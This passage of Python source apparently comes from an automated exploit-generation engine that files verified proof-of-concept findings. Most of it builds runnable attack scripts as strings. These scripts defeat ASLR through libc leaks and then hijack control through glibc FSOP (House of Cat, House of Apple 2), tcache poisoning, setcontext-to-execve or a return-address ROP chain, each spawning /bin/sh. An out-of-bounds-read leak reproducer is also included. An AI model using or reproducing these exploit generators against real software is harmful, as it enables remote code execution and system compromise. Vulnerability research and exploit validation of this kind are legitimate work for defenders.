        "  w(0xa0, file_addr+0x180); w(0xc0, 1); w(0xd8, BASE+WFJ)\n"
        "  w(0x180+0x18, 0); w(0x180+0x20, 1); w(0x180+0x30, 0); w(0x180+0xe0, file_addr+0x300)\n"
        "  return bytes(b)\n"
        "drain()\n"
        "alloc(BIG); alloc(GUARD); alloc(BIG); alloc(GUARD)\n"   # big1,g,big2,g
        "free(0); free(2)\n"
        "lk=view(0)\n"
        "assert len(lk)>=16, 'view disclosed <16 bytes'\n"
        "fd=int.from_bytes(lk[:8],'little'); bk=int.from_bytes(lk[8:16],'little')\n"
        "BASE=fd-UOFF\n"
        "assert BASE>0 and BASE%0x1000==0, 'no page-aligned libc base from the unsorted leak'\n"
        "blob_addr=bk-BLOB_GAP\n"
        "alloc(BIG)\n"                                     # reclaim big1
        "edit(4, cat_blob(blob_addr))\n"
        "alloc(SMALL); alloc(SMALL); free(5); free(6)\n"
        "kk=view(5)\n"
        "key=next((int.from_bytes(kk[i:i+8],'little') for i in range(0,max(1,len(kk)-7)) "
        "if 0x100<=int.from_bytes(kk[i:i+8],'little')<(1<<36)), None)\n"
        "assert key is not None, 'no heap key for the poison'\n"
        "edit(6, struct.pack('<Q', key ^ ((BASE+LIST_ALL)&~0xf)))\n"
        "alloc(SMALL); alloc(SMALL)\n"
        "edit(8, struct.pack('<Q', blob_addr))\n"          # _IO_list_all := &blob
        f"send({exitseq!r}); time.sleep(0.2)\n"            # exit -> _IO_flush_all -> system(' /bin/sh')
        "send('echo CAT_SHELL_$((1+1))\\n')\n"             # a shell evaluates the arithmetic
        "out=drain(1.0)\n"
        "sys.stdout.write(out.decode('latin-1','ignore'))\n"
        "print('\\n[+] shell confirmed' if b'CAT_SHELL_2' in out else '[-] no shell')\n"
    ).encode()


def _file_house_of_cat_l3(ctx, target, lead, vclass, roles, base, uoff, cat, exit_seqs):
    """File a confirmed no-win House-of-Cat shell as an L3 verified PoC (bundle = target + a runnable
    FSOP reproducer that recovers the base and spawns a shell)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    from .heap import request2size
    blob_gap = request2size(_HOC_BIG) + request2size(_HOC_GUARD) - 0x10
    script = _house_of_cat_repro_script(roles, uoff, cat, exit_seqs, blob_gap)
    input_sha = ctx.put_artifact("house-of-cat-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->shell (House of Cat FSOP, no win function)", "target": "shell",
            "libc_base": hex(base), "leak_option": roles["view"], "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": "shell", "confirmed": True,
                                   "note": "House of Cat FSOP, no win function"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    eff = (f"working heap exploit ({vclass} -> SHELL with NO win function, via House of Cat / FSOP): "
           f"option {roles['view']}'s view of a freed large chunk disclosed the libc base (unsorted "
           f"bin fd) and a heap address, a fake _IO_FILE was written into a heap chunk, ONE "
           f"safe-linked tcache poison pointed _IO_list_all at it, and returning from main made "
           f"exit() flush it -> system(\" /bin/sh\"). Shown in ONE process (a real ASLR defeat -- "
           f"libc base {base:#x} recovered live) and confirmed by a shell EVALUATING a forgery-proof "
           f"marker command under a passing negative control (a corrupted _IO_list_all spawns none).")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": "Shell (demonstrated): L3 House of Cat FSOP (no win function)",
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:house-of-cat:{target.id}", "site_detail": "shell",
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": "Spawned shell (House of Cat FSOP, no win, ASLR defeated)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "technique": "house-of-cat", "libc_base": hex(base), "bundle": bundle_sha})
    ctx.progress(pct=100, msg="L3 CONFIRMED (heap): House of Cat FSOP -> shell (no win)")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "house_of_cat": True}}


def _stage_and_crawl(ctx, target, *, exe_dir=None):
    """Stage the target and share the menu op-model crawl, as the win-bearing path below does.
    Returns (workdir, exe, opts, model, width) -- the caller owns the workdir -- or None."""
    from ...db.dao import StringDAO
    from ..dynamic import sandbox
    from ..dynamic.heap_discover import shared_op_model
    from ..fuzz import menu
    workdir = Path(tempfile.mkdtemp(prefix="lykos-chain-"))
    sandbox.protect_dir(getattr(ctx.content, "root", None))
    try:
        exe = workdir / "target.bin"
        ctx.content.stage_target(target, exe.parent, exe.name)
        exe.chmod(0o755)
        strings = [x.value for x in StringDAO(ctx.conn).list_by_target(target.id)
                   if getattr(x, "value", None)]
        opts = menu.detect_menu(strings)
        width, model = shared_op_model(ctx, target, workdir, exe, opts)
        return workdir, exe, opts, model, width
    except Exception:                                    # noqa: BLE001
        observe.absorbed(_log, "staging for the write-what-where route")
        shutil.rmtree(workdir, ignore_errors=True)
        return None


# ------------------------------------------- write-what-where -> shell, with no win function at all
#: GOT slots worth READING for a libc leak, most-likely-resolved first. A lazily-bound slot still
#: holds a PLT stub until its function has been called, and `resolve_libc_base` rejects that (the
#: subtraction is not page aligned), so the order is "what a menu program has certainly called by
#: the time it prints its first prompt" -- the stream setup and the prompt itself.
_LEAK_SLOT_ORDER = ("setvbuf", "setbuf", "printf", "puts", "putchar", "fwrite", "fflush",
                    "__printf_chk", "write", "scanf", "__isoc99_scanf", "fgets", "read", "malloc",
                    "free", "memset", "strlen", "exit")


def _leak_slots(target_bytes) -> list:
    """[(got_address, libc symbol name)] to try the libc leak through, hot slots first."""
    from . import rop
    got = rop.got_entries(target_bytes)
    return sorted(((a, n) for n, a in got.items()),
                  key=lambda an: (_LEAK_SLOT_ORDER.index(an[1])
                                  if an[1] in _LEAK_SLOT_ORDER else 99, an[1]))


def _exit_sequences(opts, model, width) -> list:
    """Input that makes a menu program RETURN FROM MAIN, so exit() flushes the forged FILE.

    Two shapes, in order. An option the crawl learned NO fields for is the quit entry (every other
    option asked for something); and a non-numeric token makes the `scanf("%d", &op) != 1` guard
    that every one of these loops is written with fail, which is the same exit by another road --
    and the one that still works when the crawl learned nothing at all."""
    from ..fuzz import menu
    seqs = [menu._scalar(o.encode(), width) for o in opts if not model.get(o)][:2]
    return seqs + [b"q\n"]


def _www_shell(ctx, target, target_bytes, lead, vclass, *, exe, opts, model, width):
    """An unchecked indexed write + its paired read -> a spawned shell, with NO win function, no
    `system` in the PLT and ASLR left on (`leak.indexed_write_fsop`). This is the branch the engine
    did not have: `_oob_write_hijack` can only point a GOT slot at a win that exists, and without
    one the whole class fell back to an L2 recipe saying a leak-based chain is analyst work.

    The write option supplies the cells and the read option supplies both leaks (the libc base out
    of a GOT slot, the forged FILE's own `_wide_data`), so the exploit is in-band and in one
    process. Returns the filer's result dict, or None with the reason emitted."""
    from ..dynamic import oob_index
    from ..fuzz import menu
    from . import exploit
    from . import leak as _leak
    from .exploit_stage import _libc_bytes_for
    arrays = (oob_index._array_candidates(exploit.elf_objects_sized(target_bytes))
              or oob_index._array_candidates_symfree(Path(exe)))
    writers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) >= 2]
    readers = [o for o in opts if o in model and "idx" in model[o] and len(model[o]) == 1]
    libc_data = _libc_bytes_for(ctx, target) or b""
    if not (arrays and writers and readers and libc_data):
        ctx.emit("chain.www", payload={"ok": False, "arrays": len(arrays), "writers": len(writers),
                 "readers": len(readers), "libc": len(libc_data),
                 "note": "need a global array, a write option (index + value), a read option "
                         "(index) and the linked libc to forge a FILE"})
        return None
    slots = _leak_slots(target_bytes)
    exits = _exit_sequences(opts, model, width)
    # An array that can hold the fake wide jump table (its +0x68 word) first: the forgery then
    # stays inside memory the bug already reaches, instead of landing past the array in whatever
    # .bss follows it.
    arrays = sorted(arrays, key=lambda a: 0 if int(a.get("size") or 0) >= 0x70 else 1)
    for arr in arrays:
        base, stride = arr["addr"], arr.get("stride", 8) or 8
        for writer in writers:
            for reader in readers:
                if ctx.should_cancel():
                    return None

                def _w(addr, val, _o=writer, _b=base, _st=stride):
                    return _oob_write_seq(_o, model[_o], (addr - _b) // _st, val, None, model, width)

                def _r(addr, _o=reader, _b=base, _st=stride):
                    return (menu._scalar(_o.encode(), width)
                            + menu._fill(model[_o], idx=str((addr - _b) // _st).encode(),
                                         width=width))
                res = _leak.indexed_write_fsop(
                    Path(exe), Path(exe).parent, write_cell=_w, read_cell=_r,
                    libc_data=libc_data, leak_slots=slots, scratch=base,
                    scratch_size=int(arr.get("size") or 0), exit_seqs=exits,
                    target_bytes=target_bytes)
                if res.get("ok"):
                    ctx.progress(msg=f"indexed-write ({res.get('plan')}): option {writer} wrote "
                                     f"{len(res.get('cells') or ())} words over "
                                     f"{res['fp_name']} (libc {res['libc_base']:#x} leaked "
                                     f"through option {reader}) -> shell")
                    return _file_www_l3(ctx, target, lead, vclass, res, arr=arr, writer=writer,
                                        reader=reader, width=width, model=model)
                ctx.emit("chain.www", payload={"ok": False, "array": arr["name"], "writer": writer,
                         "reader": reader, "libc_base": res.get("libc_base"),
                         "plans_tried": res.get("plans_tried"), "note": res.get("reason", "")})
                if "did not read back" in (res.get("reason") or ""):
                    break                                # this writer cannot place a word; next one
    return None


def _www_repro_script(*, arr_name, arr_addr, stride, writer, reader, fields, rfields, width,
                      exits, plan="system", targets=None) -> bytes:
    """A self-contained reproducer. It redoes the LEAK (so it is not a hardcoded address): read a
    GOT slot through the unchecked index, subtract the symbol's offset in the libc the target
    links, keep the result only if it is page aligned -- then write the cells and exit.

    `plan` picks which FSOP payload to render, and only the offsets WITHIN libc are baked in
    (`targets`, which `leak.indexed_write_fsop` reports for the plan that worked): the base is
    still leaked at run time, exactly as the engine did it."""
    import json as _json

    from . import heap as _heap
    T = dict(targets or {})
    return ("#!/usr/bin/env python3\n"
            f"# write-what-where -> FSOP reproducer, {plan} plan (stdlib only).\n"
            "#   usage: python3 exploit.py ./target.bin\n"
            "import re, select, struct, subprocess, sys, time\n"
            f"ARR={arr_addr:#x}; STRIDE={stride}; WRITER={writer!r}; READER={reader!r}\n"
            f"PLAN={plan!r}\n"
            f"SCENTRY={int(T.get('setcontext') or 0):#x}; EXECVE={int(T.get('execve') or 0):#x}; "
            f"BINSH={int(T.get('binsh') or 0):#x}\n"
            f"GREGS={_json.dumps(T.get('fields') or {})}; RIP_AT={int(T.get('rip_at') or 0):#x}\n"
            f"ENVIRON={int(T.get('environ') or 0):#x}; POP_RDI={int(T.get('pop_rdi') or 0):#x}; "
            f"RETG={int(T.get('ret') or 0):#x}; ALIGN={bool(T.get('align'))!r}\n"
            f"LIST_ALL={int(T.get('list_all') or 0):#x}; FINISH={(T.get('plan') or 'system')!r}; "
            f"CAT={{'wide':{_heap.cat_offsets()['wide']:#x},'vt':{_heap.cat_offsets()['vt']:#x},"
            f"'lock':{_heap.cat_offsets()['lock']:#x},'size':{_heap.CAT_BLOB_MIN:#x}}}\n"
            f"WFIELDS={_json.dumps(fields)}; RFIELDS={_json.dumps(rfields)}; "
            f"WIDTH={width!r}; EXITS={_json.dumps([e.decode('latin1') for e in exits])}\n"
            "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
            "F={'flags':0x00,'wptr':0x28,'wide':0xa0,'vtable':0xd8,'wd_buf':0x30,'wd_vt':0xe0,\n"
            "   'doalloc':0x68}\n"
            "def run(*a):\n"
            "    return subprocess.run(a, capture_output=True, text=True).stdout\n"
            "libc=re.search(r'=>\\s*(\\S+libc\\.so\\.6)', run('ldd', EXE)).group(1)\n"
            "S={}\n"
            "for m in re.finditer(r'^([0-9a-f]+)\\s+\\S+\\s+(\\S+)', run('nm','-D','--defined-only',libc), re.M):\n"
            "    S.setdefault(m.group(2).split('@')[0], int(m.group(1),16))\n"
            "GOT={m.group(2): int(m.group(1),16) for m in\n"
            "     re.finditer(r'^([0-9a-f]+)\\s+\\S+\\s+(\\S+?)(?:@\\S+)?\\s*$', run('objdump','-R',EXE), re.M)}\n"
            "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,\n"
            "                   stderr=subprocess.STDOUT,start_new_session=True)\n"
            "def cell(v):\n"
            "    s=str(v).encode()\n"
            "    return s.ljust(WIDTH, b'\\x00') if WIDTH else s+b'\\n'\n"
            "def op(seq, secs=0.3):\n"
            "    p.stdin.write(seq); p.stdin.flush()\n"
            "    out=b''; end=time.time()+secs\n"
            "    while time.time()<end:\n"
            "        if select.select([p.stdout],[],[],0.05)[0]:\n"
            "            b=p.stdout.read1(65536)\n"
            "            if not b: break\n"
            "            out+=b\n"
            "    return out\n"
            "def drive(fields, idx, val):\n"
            "    out=b''\n"
            "    for f in fields:\n"
            "        out+=cell(idx if f=='idx' else val)\n"
            "    return out\n"
            "def rd(addr):\n"
            "    out=op(cell(READER)+drive(RFIELDS,(addr-ARR)//STRIDE,0))\n"
            "    vals=[int(x)&(2**64-1) for x in re.findall(rb'-?\\d{2,}',out)]\n"
            "    return vals\n"
            "def wr(addr,val):\n"
            "    v=struct.unpack('<q',struct.pack('<Q',val&(2**64-1)))[0]\n"
            "    op(cell(WRITER)+drive(WFIELDS,(addr-ARR)//STRIDE,v))\n"
            "op(b'',0.3)\n"
            "base=None\n"
            "for name,slot in GOT.items():\n"
            "    if name not in S: continue\n"
            "    for v in rd(slot):\n"
            "        c=v-S[name]\n"
            "        if c>0 and c%0x1000==0: base=c; break\n"
            "    if base: break\n"
            "assert base, 'no GOT read resolved a page-aligned libc base'\n"
            "print('libc base %#x' % base)\n"
            "if PLAN!='stack':\n"
            "    fp=base+S['_IO_2_1_stderr_']\n"
            "    wide=next(v for v in rd(fp+F['wide']) if base<=v<base+0x600000)\n"
            "if PLAN=='stack':\n"
            "    # No FILE and no allocator: libc exports `environ`, whose VALUE is the envp array\n"
            "    # the kernel left on the stack, so one read turns the arbitrary read into a stack\n"
            "    # address. Main's saved return address is the first libc CODE pointer below it\n"
            "    # that is not inside __libc_start_main -- the two libc return addresses above\n"
            "    # main's both belong to frames that are never returned from (__libc_start_main\n"
            "    # calls __libc_start_call_main, which is noreturn), and main's own points into\n"
            "    # __libc_start_call_main, which no libc exports. Re-derived here, not baked in.\n"
            "    tx=re.search(r'\\.text\\s+\\S+\\s+([0-9a-f]+)\\s+\\S+\\s+([0-9a-f]+)',\n"
            "                 run('readelf','-SW',libc))\n"
            "    TLO,TSZ=int(tx.group(1),16),int(tx.group(2),16)\n"
            "    lsm=re.search(r'([0-9a-f]+)\\s+(\\d+)\\s+FUNC\\s+\\S+\\s+\\S+\\s+\\S+\\s+"
            "__libc_start_main', run('readelf','-sW',libc))\n"
            "    LSM=(int(lsm.group(1),16), int(lsm.group(2))) if lsm else (0,0)\n"
            "    stack=next(v for v in rd(base+ENVIRON) if 0x7f0000000000<v<0x800000000000)\n"
            "    print('environ -> stack %#x' % stack)\n"
            "    slot=None\n"
            "    for a in range((stack&~7), (stack&~7)-0x400, -8):\n"
            "        vs=rd(a)\n"
            "        if not vs: continue\n"
            "        v=vs[-1]\n"
            "        if not (base+TLO <= v < base+TLO+TSZ): continue\n"
            "        if base+LSM[0] <= v < base+LSM[0]+max(LSM[1],1): continue\n"
            "        slot=a; print(\"main's saved return %#x = libc+%#x\" % (a, v-base)); break\n"
            "    assert slot, 'no saved return address into libc below environ'\n"
            "    chain=([base+RETG] if ALIGN else [])+[base+POP_RDI, base+BINSH, base+S['system']]\n"
            "    for k,w in enumerate(chain): wr(slot+8*k, w)\n"
            "    assert [rd(slot+8*k)[-1] for k in range(len(chain))]==chain, 'chain did not land'\n"
            "elif PLAN=='cat':\n"
            "    # House of Cat: do not forge a FILE glibc owns. Build the whole FILE, its\n"
            "    # _IO_wide_data and its fake _wide_vtable inside the target's own array, then\n"
            "    # write ONE pointer -- _IO_list_all := &array. _mode is 1 so the flush test\n"
            "    # reads the WIDE write pointers, which are inside the blob.\n"
            "    blob=bytearray(CAT['size'])\n"
            "    def bw(o,v): blob[o:o+8]=struct.pack('<Q', v & (2**64-1))\n"
            "    if FINISH=='setcontext':\n"
            "        bw(0x00, 0x8000)                      # _IO_USER_LOCK: skip the lock\n"
            "        bw(GREGS['rdi'], base+BINSH); bw(GREGS['rsi'], 0); bw(GREGS['rdx'], 0)\n"
            "        bw(RIP_AT, base+EXECVE); bw(CAT['vt']+0x68, base+SCENTRY)\n"
            "    else:\n"
            "        blob[0x00:0x08]=b' /bin/sh'           # _flags doubles as the command\n"
            "        bw(0x88, ARR+CAT['lock']); bw(0x68, 0); bw(CAT['vt']+0x68, base+S['system'])\n"
            "    bw(0xa0, ARR+CAT['wide']); bw(0xc0, 1); bw(0xd8, base+S['_IO_wfile_jumps'])\n"
            "    bw(CAT['wide']+0x18, 0); bw(CAT['wide']+0x20, 1); bw(CAT['wide']+0x30, 0)\n"
            "    bw(CAT['wide']+0xe0, ARR+CAT['vt'])\n"
            "    for o in range(0, len(blob), 8):\n"
            "        v=struct.unpack('<Q', blob[o:o+8])[0]\n"
            "        if v: wr(ARR+o, v)\n"
            "    wr(base+LIST_ALL, ARR)\n"
            "elif PLAN=='setcontext':\n"
            "    # _IO_wdoallocbuf does `mov rdx,rdi` before the vtable call, so the forged FILE\n"
            "    # IS setcontext's ucontext. _IO_UNBUFFERED must go (wdoallocbuf opens\n"
            "    # `test BYTE PTR [rdi],2` and the unbuffered path never reaches the call);\n"
            "    # _IO_USER_LOCK goes in so _IO_flockfile never derefs _lock, which frees\n"
            "    # fp+0x88 == gregs[RDX] to be 0 -- hence execve with no chain and no gadget.\n"
            "    flags=next(v for v in rd(fp+F['flags']) if v>>16==0xFBAD)\n"
            "    wr(ARR+F['doalloc'], base+SCENTRY)\n"
            "    wr(wide+F['wd_vt'], ARR)\n"
            "    wr(fp+F['wptr'], 1)\n"
            "    wr(fp+GREGS['rdi'], base+BINSH)\n"
            "    wr(fp+GREGS['rsi'], 0)\n"
            "    wr(fp+GREGS['rdx'], 0)\n"
            "    wr(fp+RIP_AT, base+EXECVE)\n"
            "    wr(fp+F['flags'], (flags & ~0x2) | 0x8000)\n"
            "    wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
            "else:\n"
            "    wr(ARR+F['doalloc'], base+S['system'])\n"
            "    wr(wide+F['wd_vt'], ARR)\n"
            "    wr(fp+F['wptr'], 1)\n"
            "    wr(fp+F['vtable'], base+S['_IO_wfile_jumps'])\n"
            "    wr(fp+F['flags'], struct.unpack('<Q', b' /bin/sh')[0])\n"
            "for e in EXITS:\n"
            "    out=op(e.encode('latin1'),0.6)+op(b'id\\n',1.0)\n"
            "    if b'uid=' in out:\n"
            "        print(out.decode('latin1','replace')); print('SHELL'); break\n"
            "else:\n"
            "    print('no shell'); sys.exit(1)\n").encode()


def _file_www_l3(ctx, target, lead, vclass, res, *, arr, writer, reader, width, model):
    """File the no-win write-what-where shell as an L3 verified PoC (bundle = target + a runnable
    leak-then-forge reproducer)."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    exits = _exit_sequences([writer, reader], model, width)
    plan = res.get("plan") or "system"
    script = _www_repro_script(arr_name=arr["name"], arr_addr=arr["addr"],
                               stride=arr.get("stride", 8) or 8, writer=writer, reader=reader,
                               fields=model[writer], rfields=model[reader], width=width,
                               exits=exits, plan=plan, targets=res.get("targets"))
    # What the hijack actually ends up calling, per plan.
    finish = res.get("finish") or plan
    effect = ('execve("/bin/sh", NULL, NULL) through setcontext' if finish == "setcontext"
              else 'system("/bin/sh")' if plan == "stack" else 'system(" /bin/sh")')
    # The stack plan is not FSOP at all, so it gets its own name and its own description of HOW.
    route = ("the environ route (main's saved return address)" if plan == "stack"
             else "House of Apple 2")
    how = (f"option {reader} read libc's `environ` through the unchecked index to disclose a "
           f"stack address, walked down it for MAIN's saved return address (the first libc code "
           f"pointer that is not inside __libc_start_main), and option {writer} wrote a "
           f"{len(res.get('cells') or ())}-word system(\"/bin/sh\") chain over it; returning "
           f"from main ran the chain"
           if plan == "stack" else
           f"option {reader} read {res['fp_name']}'s own _wide_data; option {writer} wrote "
           f"{len(res.get('cells') or ())} House-of-Apple-2 cells ({plan} plan) over that FILE "
           f"through {arr['name']}, with the fake wide jump table placed inside {arr['name']} "
           f"itself; exit() flushed the forged FILE and its _IO_wfile_overflow called {effect}")
    input_sha = ctx.put_artifact("www-fsop-repro", data=script)
    meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
            "exploit": f"{vclass}->{route}/{plan} (no win, libc leaked in band)",
            "libc_base": hex(res["libc_base"]), "forged": res["fp_name"],
            "tool_version": TOOL_VERSION}
    data = bundle.build(ctx.content.path(target.sha256).read_bytes(), script, meta, b"",
                        "stdin", [], None,
                        primitive={"type": vclass, "target": effect, "offset": None,
                                   "confirmed": True,
                                   "note": f"write-what-where -> {route}"})
    bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
    poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                     signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
    eff = (f"working exploit ({vclass} -> arbitrary write -> code execution) with NO win function "
           f"and no system() in the target's PLT: option {reader} read a GOT slot through the "
           f"unchecked index to recover the libc base ({res['libc_base']:#x}, ASLR on); then "
           f"{how}, calling {effect}. Confirmed by a shell that echoed our marker -- every cell "
           f"read back before the trigger, all in ONE process.")
    fd = FindingDAO(ctx.conn)
    cand = {"cwe": lead.cwe,
            "title": "Code execution (demonstrated): L3 arbitrary write -> "
                     + ("saved return address" if plan == "stack" else "FSOP"),
            "severity": "critical", "detector": "chain_primitive", "state": "poc-backed",
            "confidence": 0.99, "authoritative": True, "title_only": True,
            "dedup_key": f"chain:{vclass}:fsop:{target.id}", "site_detail": arr["name"],
            "evidence": [{"channel": "effects", "detail": _json.dumps([{
                "kind": "rce", "title": f"Arbitrary write -> {route} shell (no win function)",
                "status": "demonstrated", "detail": eff,
                "proof": {"type": "bundle", "sha": bundle_sha, "input_sha": input_sha,
                          "note": eff, "shell": True}}])}]}
    fd.upsert(target.id, target.case_id, cand)
    fid = fd.id_for_dedup(target.id, cand["dedup_key"])
    if fid:
        PocDAO(ctx.conn).set_finding(poc_id, fid)
    _promote_lead(ctx, target, lead, level="L3", bundle_sha=bundle_sha, detail=eff)
    ctx.emit("chain.done", payload={"applicable": True, "confirmed": True, "vclass": vclass,
             "win": None, "exploit": "www-fsop", "shell": True, "writer": writer, "reader": reader,
             "libc_base": hex(res["libc_base"]), "forged": res["fp_name"], "cells": res["cells"],
             "bundle": bundle_sha})
    ctx.progress(pct=100, msg=f"L3 CONFIRMED: {vclass} -> {route} -> {effect} (no win)")
    return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
            "metrics": {"chained": True, "level": "L3", "vclass": vclass, "shell": True,
                        "exploit": "www-fsop"}}


#: The technique to build next to carry a chain past L2, by primitive class -- more specific than
#: the generic per-CWE default; the weaponization backlog ranks by it.
_CHAIN_TECHNIQUE = {
    "oob_write": ("constrain the attacker-controlled index + value to land the computed write on a "
                  "LIVE code/function pointer, plus a runnable build to detonate the redirect"),
    "heap_overflow": ("a heap-layout (grooming) solver to place the overflow adjacent to a chosen "
                      "target object, plus a runnable build to detonate the corruption"),
    "uaf": ("a reclaim/grooming solver to reoccupy the freed chunk with an attacker-shaped object, "
            "plus a runnable build to detonate the controlled use"),
    "double_free": ("an allocator-state model to turn the double free into a controlled reclaim, "
                    "plus a runnable build to detonate it"),
}


def _annotate_lead_ceiling(ctx, target, lead, *, level, why, missing_technique=None) -> None:
    """Record on the LEAD how far its chain got and why it stopped.

    `_file_recipe` writes a second row ("Exploitation recipe: ...") and leaves the lead untouched,
    so one defect becomes two corroborated rows and NEITHER says where the attempt ended --
    measured, `chain_primitive`'s own recipe finding stayed below poc-backed 7 times out of 7
    alongside the `oob_index` lead that produced it. A reader then sees two potentials and no
    account of what was tried. The ceiling goes on the lead, in its own channel, so it survives
    the next re-run of whichever detector owns the row."""
    from ...db.dao import FindingDAO
    needs = f" [needs: {missing_technique}]" if missing_technique else ""
    try:
        FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
            "cwe": lead.cwe, "title": lead.title, "severity": lead.severity,
            "detector": lead.detector, "state": lead.state, "confidence": lead.confidence,
            "dedup_key": lead.dedup_key,
            "evidence": [{"channel": "chain-ceiling",
                          "detail": f"a recipe targeting {level} was computed but not "
                                    f"executed; to carry it further: {why}{needs}"}]})
    except Exception:                                    # noqa: BLE001 -- never fail the filing
        observe.absorbed(_log, "leaving the lead alone")


def _index_seq_builder(opts, model, width):
    """`seq_for(index, value)` driving the crawl's index-taking WRITE option (the same option choice
    `_oob_write_hijack` makes), or None when the crawl learned no such option."""
    writers = [o for o in (opts or []) if o in (model or {}) and "idx" in model[o]
               and len(model[o]) >= 2]
    if not writers:
        return None
    w = writers[0]
    return lambda i, v: _oob_write_seq(w, model[w], i, v, None, model, width)


def _static_index_recipe(ctx, target, lead, why, seq_for=None) -> list:
    """The CWE-129 index-write recipe with its NUMBERS (index, value, target slot) -- see
    `oob_recipe`. Only for a lead that names an indexed write (oob_write vclass)."""
    if lead is None or _VCLASS.get(lead.cwe) != "oob_write":
        return []
    from . import oob_recipe
    return oob_recipe.file_oob_index_recipe(ctx, target, lead, why=why, seq_for=seq_for)


def _file_recipe(ctx, target, lead, vclass, win, recipe, why, seq_for=None) -> None:
    """L2 guidance: the concrete technique + target to finish the chain by hand. For an indexed
    write the exact index/value pair is filed alongside (`_static_index_recipe`)."""
    from ...db.dao import FindingDAO
    if vclass == "oob_write":
        _static_index_recipe(ctx, target, lead, why, seq_for=seq_for)
    tech = recipe.get("technique", "heap-technique")
    tgt = f" -> {win[0]} (0x{win[1]:x})" if win else ""
    detail = (f"{vclass} primitive can be chained via {tech}{tgt}, but a live hijack was not "
              f"demonstrated here ({why}). {recipe.get('note', '')}").strip()
    FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
        "cwe": lead.cwe, "title": f"Exploitation recipe: {vclass} -> {tech}",
        "severity": "high", "detector": "chain_primitive", "state": "corroborated",
        "confidence": 0.5, "dedup_key": f"chain-recipe:{vclass}:{target.id}",
        "site_detail": tech,
        "evidence": [{"channel": "chain", "detail": detail}]})
    _annotate_lead_ceiling(ctx, target, lead, level="L2", why=why,
                           missing_technique=_CHAIN_TECHNIQUE.get(vclass))


def _oob_read_repro_script(read_opt, idx, label, off) -> bytes:
    """A stdlib-only reproducer for the OOB-read base disclosure: drive the read option at the
    out-of-bounds index that discloses a known pointer (a libc symbol's GOT slot, or an image
    pointer), parse it and subtract the baked offset -- a page-aligned result is the recovered base
    (the libc base for a GOT slot, the PIE image base for an image pointer)."""
    return (
        "#!/usr/bin/env python3\n"
        "# OOB-read info-disclosure reproducer (stdlib). Usage: python3 exploit.py ./target.bin\n"
        "import subprocess, select, os, re, sys, time\n"
        f"READ={read_opt!r}; IDX={idx}; LABEL={label!r}; OFF={off:#x}\n"
        "EXE=sys.argv[1] if len(sys.argv)>1 else './target.bin'\n"
        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
        "def drain(t=0.4):\n"
        "  b=b''; end=time.time()+t\n"
        "  while time.time()<end:\n"
        "    r,_,_=select.select([p.stdout],[],[],0.2)\n"
        "    if r:\n"
        "      c=os.read(p.stdout.fileno(),4096)\n"
        "      if not c: break\n"
        "      b+=c\n"
        "    elif p.poll() is not None: break\n"
        "  return b\n"
        "def send(s): p.stdin.write(s.encode() if isinstance(s,str) else s); p.stdin.flush()\n"
        "drain()\n"
        "send(READ+'\\n'); send(str(IDX)+'\\n'); out=drain()\n"
        "vals=[int(m,16) for m in re.findall(rb'0x([0-9a-fA-F]{6,16})',out)]\n"
        "vals+=[int(m)&0xffffffffffffffff for m in re.findall(rb'-?\\d{3,25}',out)]\n"
        "base=next((v-OFF for v in vals if (v-OFF)>0 and (v-OFF)%0x1000==0), None)\n"
        "print('[+] leaked %s -> base %#x'%(LABEL,base) if base else '[-] no base disclosed')\n"
        "sys.exit(0 if base else 1)\n"
    ).encode()


def _file_oob_read_disclose_l3(ctx, target, lead, hit):
    """File a confirmed out-of-bounds-read information disclosure as an L3 verified PoC: the exploit
    IS the disclosure (a recovered libc or PIE base), bundle = target + a runnable leak reproducer.
    `hit` is the dict from `_oob_read_disclose` (kind 'libc' or 'pie')."""
    import json as _json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle
    arr, read_opt, kind, idx, base, off = (hit["array"], hit["read_opt"], hit["kind"], hit["idx"],
                                           hit["base"], hit["off"])
    arrn = arr.get("name") or f"{arr['addr']:#x}"
    stride = arr.get("stride", 8) or 8
    label = f"{hit['name']}@got" if kind == "libc" else "image pointer"
    base_kind = "libc base" if kind == "libc" else "PIE image base"
    script = _oob_read_repro_script(read_opt, idx, label, off)
